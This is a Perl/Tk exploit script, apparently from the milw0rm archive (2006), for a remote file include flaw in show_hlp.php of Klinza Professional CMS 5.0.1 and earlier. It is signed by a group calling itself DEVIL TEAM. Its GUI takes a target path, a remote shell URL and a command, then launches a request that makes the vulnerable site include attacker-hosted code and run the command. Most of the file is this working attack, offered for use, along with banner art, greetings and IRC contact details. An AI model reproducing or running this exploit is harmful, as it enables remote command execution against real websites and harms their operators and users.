#!/usr/bin/perl

#:::::::::  :::::::::: :::     ::: ::::::::::: :::        
#:+:    :+: :+:        :+:     :+:     :+:     :+:        
#+:+    +:+ +:+        +:+     +:+     +:+     +:+        
#+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
#+#+    +#+ +#+         +#+   +#+      +#+     +#+        
##+#    #+# #+#          #+#+#+#       #+#     #+#        
##########  ##########     ###     ########### ########## 
#::::::::::: ::::::::::     :::     ::::    ::::  
#    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
#    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
#    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
#    +#+     +#+        +#+     +#+ +#+       +#+ 
#    #+#     #+#        #+#     #+# #+#       #+# 
#    ###     ########## ###     ### ###       ### 
#	
#	
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Klinza Professional CMS <= 5.0.1 (show_hlp.php) Remote File Include Exploit
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- [Script name: Klinza Professional CMS 5.0.1
#- [Script site: http://sourceforge.net/project/showfiles.php?group_id=121246
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-          Find by: Kacper (a.k.a Rahim)
#+
#-    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam
#+
#-          Contact: kacper1964@yahoo.pl
#-                        or
#-           http://www.rahim.webd.pl/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Special Greetz: DragonHeart ;-)
#- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus
#-                 SkD, nukedclx, Ramzes
#-
#- Greetz for all users DEVIL TEAM IRC Channel !!
#!@ Przyjazni nie da sie zamienic na marne korzysci @!
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-            Z Dedykacja dla osoby,
#-         bez ktorej nie mogl bym zyc...
#-           K.C:* J.M (a.k.a Magaja)
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

use Tk;
use Tk::DialogBox;
use LWP::UserAgent;


$mw = new MainWindow(title => "DEVIL TEAM :: Klinza Professional CMS <= 5.0.1 (show_hlp.php) Remote File Include Exploit :: by Kacper ;-)  " );

$mw->geometry ( '500x300' ) ;
$mw->resizable(0,0);


$mw->Label(-text => 'Klinza Professional CMS <= 5.0.1 (show_hlp.php) Remote File Include Exploit by Kacper', -font => '{Verdana} 7 bold',-foreground=>'blue')->pack();
$mw->Label(-text => '')->pack();

$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

$url = 'http://www.site.com/[Klinza_path]/funzioni/lib/show_hlp.php?appl[APPL]=';
$shell_path = 'http://server/shell.txt?';
$cmd = 'ls -la';


$fleft->Label ( -text => 'Script Path: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'Shell Path: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$shell_path) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'CMD: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$cmd) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fright->Label( -text => ' ')->pack();
$fleft->Label( -text => ' ')->pack();



$fright->Button(-text    => 'Exploit Include Vulnerability',
                -relief => "groove",
                -width => '30',
                -font => '{Verdana} 8 bold',
                -activeforeground => 'red',
                -command => \&akcja
               )->pack();


$fright->Label( -text => ' ')->pack();
$fright->Label( -text => 'Exploit coded by Kacper', -font => '{Verdana} 7')->pack();
$fright->Label( -text => 'DEVIL TEAM :: The Best Polish Team', -font => '{Verdana} 7')->pack();
$fright->Label( -text => 'http://www.rahim.webd.pl/', -font => '{Verdana} 7')->pack();


MainLoop();


sub akcja()
{

$InfoWindow=$mw->DialogBox(-title   => 'DEVIL TEAM :: Exploit by Kacper ;-) ', -buttons => ["OK"]);
$InfoWindow->add('Label', -text => 'Enter to DEVIL TEAM IRC CHANNEL: 72.20.18.6:6667 #devilteam', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'DEVIL TEAM SITE: http://www.rahim.webd.pl/', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'Greetz For my friends ;-)', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;

system("start $url$shell_path$cmd");
$InfoWindow->Show();
}

# milw0rm.com [2006-10-03]
